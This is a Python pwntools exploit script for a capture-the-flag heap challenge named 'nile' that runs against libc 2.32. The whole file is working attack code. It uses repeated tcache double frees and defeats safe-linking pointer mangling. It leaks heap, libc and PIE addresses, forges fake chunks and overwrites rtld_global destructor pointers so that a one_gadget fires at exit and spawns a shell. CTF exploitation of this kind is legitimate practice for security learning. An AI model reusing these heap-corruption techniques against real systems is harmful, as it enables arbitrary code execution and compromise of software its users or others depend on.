#!/usr/bin/python
from pwn import *
import sys

LOCAL = True

HOST = "chall.polygl0ts.ch"
PORT = 3800
PROCESS = "./nile"

def addfake(len, data):
	r.sendline("1")
	r.sendlineafter("> ", str(len))
	r.send(data)
	r.recvuntil("> ")

def adddesc(len, data):
	r.sendline("2")
	r.sendlineafter("> ", str(len))
	r.send(data)
	r.recvuntil("> ")

def review():
	r.sendline("3")
	r.recvline()
	LEAK = r.recvuntil("I hope", drop=True)
	r.recvuntil("> ")
	return LEAK

def remove(idx):
	r.sendline("4")
	r.sendlineafter("> ", str(idx))
	r.recvuntil("> ")

def upgrade():
	r.sendline("5")
	r.recvuntil("> ")

def demangle(obfus_ptr):
    o2 = (obfus_ptr >> 12) ^ obfus_ptr
    return (o2 >> 24) ^ o2

def exploit(r):
	r.recvuntil("> ")

	# create initial chunks
	for i in range(12):	
		adddesc(0x20-8, "A"*(0x20-8))
	
	# fillup tcache 
	for i in range(7):	
		remove(i)

	# upgrade to be able to allocate more chunks
	upgrade()
	
	# double free first chunk
	remove(0)
	remove(1)
	remove(0)

	# add a new chunk (0 and 11 will now point to the same chunk)
	adddesc(0x20-8, "A")	# 11

	# free chunk 0
	remove(0)

	# leak heap value from chunk 11 (which is now freed)
	with open("/proc/sys/kernel/randomize_va_space", "r") as f:
		state = f.read()[0]

	ASLR = state == "2"

	if LOCAL and not ASLR:	   	
		LEAK = 0x000055500000835d # 0x000055500000811d
	else:
		LEAK = u64(review()[:-1].ljust(8, "\x00"))
	
	HEAP = demangle(LEAK)

	log.info("LEAK       : %s" % hex(LEAK))
	log.info("HEAP       : %s" % hex(HEAP))

	GUARD = HEAP >> 12

	log.info("HEAP guard : %s" % hex(GUARD))

	# overwrite FD of double freed chunk with pointer above pro plan chunk
	adddesc(0x20-8, p64(HEAP+0x40^GUARD))

	# create size for fake 0x50 chunk before pro_plan chunk
	payload = p64(0) + p64(0)
	payload += p64(0) + p64(0)
	payload += p64(0) + p64(0)
	payload += p64(0) + p64(0x51)[:1]

	adddesc(len(payload), payload)
	adddesc(0x20-8, "C"*(0x20-8))

	# allocate fake chunk and overwrite pro_plan chunk
	payload = p64(0) + p64(0xc11)
	payload += p64(HEAP+0x60) + p64(0x40)   # chunk ptr / size
	payload += p64(0x0) + p64(HEAP+0x60)    # is_freed / chunk_ptr
	payload += p64(0x40)                    # size

	adddesc(len(payload), payload)
	
	# create endorsement to avoid crash in malloc_consolidate
	addfake(0x20-8, "A")

	# free pro_plan chunk (free unsorted bin now)
	remove(3)			

	# allocate chunks pointing to freed unsorted bin address (so they can be reviewed)
	payload = p64(HEAP+0x120) + p64(0x0)
	payload += p64(0) 

	addfake(len(payload), payload)
	addfake(len(payload), payload)
	addfake(len(payload), payload)
	addfake(len(payload), payload)

	# leak main arena ptr from review
	LEAK = u64(review()[:6].ljust(8, "\x00"))
	libc.address = LEAK - 0x1c2a60

	log.info("LIBC leak    : %s" % hex(LEAK))
	log.info("LIBC         : %s" % hex(libc.address))

	log.info("MAIN_ARENA   : %s" % hex(libc.symbols["main_arena"]))

	# overwrite an allocated chunk with pointer to pie address
	payload = p64(libc.address+0x1c1d80) + p64(0x0)
	payload += p64(0) + p64(0x51)[:1]

	addfake(len(payload), payload)

	# leak pie address from review
	PIE = u64(review().split("\n")[4].ljust(8, "\x00"))
	
	log.info("PIE          : %s" % hex(PIE))

	# double free
	remove(0)
	remove(1)
	remove(0)
	
	# point fd to unsorted bin
	adddesc(0x10, p64((HEAP+0x130)^GUARD))
	adddesc(0x10, p64(0xdeadbeef))
	adddesc(0x10, p64(0xdeadbeef))

	# fix unsorted bin pointers
	payload = p64(0) + p64(0x21)
	payload += p64(libc.address+0x1c2a60) + p64(libc.address+0x1c2a60)
	payload += p64(0x20) + p64(0x20)

	adddesc(len(payload), payload)

	# increase pro plan counter
	for i in range(61):
		addfake(10, "A")
	
	# double free
	remove(0)
	remove(1)
	remove(0)

	# overwrite FD with pointer to pro_plan address
	adddesc(0x10, p64((PIE+0x40)^GUARD))
	adddesc(0x10, p64(0xdeadbeef))
	adddesc(0x10, p64(0xdeadbeef))
	
	if LOCAL and not ASLR:
		LD = libc.address + 0x1d1000
	else:
	 	LD = libc.address + 0x1cb000

	RTLD = LD + 0x2e1d0
	TARGET = RTLD-(0x50*24)

	log.info("TARGET CHUNK : %s" % hex(RTLD))

	# overwrite pro_plan address with address to rtld_global
	payload = p64(TARGET)

	adddesc(len(payload), payload)

	addfake(20, "X"*19)
	addfake(20, "Y"*19)

	# overwrite dtor with gadget (check which)
	payload = "Z"*8 + p64(libc.address+0x000000000007b4c7)
	
	addfake(20, payload)

	# double free
	remove(0)
	remove(1)
	remove(0)

	CALL = libc.address+0x000000000012dd44
	
	# overwrite free fd with ptr to pro plan again	
	adddesc(0x10, p64((PIE+0x40)^GUARD))	
	adddesc(0x10, p64(0xdeadbeef)+p64(0xcafebabe))	
	adddesc(0x10, p64(0xdeadbeef)+p64(CALL-(PIE-0x4080)))	
	addfake(20, "A")
	
	# overwrite pro_plan with address above pro plan to overwrite allocated chunk count (to make free work)
	TARGET = (PIE+0x38)-(0x58*24)
	payload = p64(TARGET)

	adddesc(len(payload), payload)

	ONE_GADGET = libc.address + 0xcda5d

	payload = "B"*0x10
	payload += p64(ONE_GADGET)

	addfake(31, payload)
	pause()	

	# exit to trigger dl_fini executing one_gadget
	r.sendline("6")

	r.interactive()
	
	return

if __name__ == "__main__":
	libc = ELF("./libc-2.32.so")

	if len(sys.argv) > 1:
		LOCAL = False
		r = remote(HOST, PORT)		
	else:
		LOCAL = True
		r = process("./nile")
		print (util.proc.pidof(r))
		pause()
	
	exploit(r)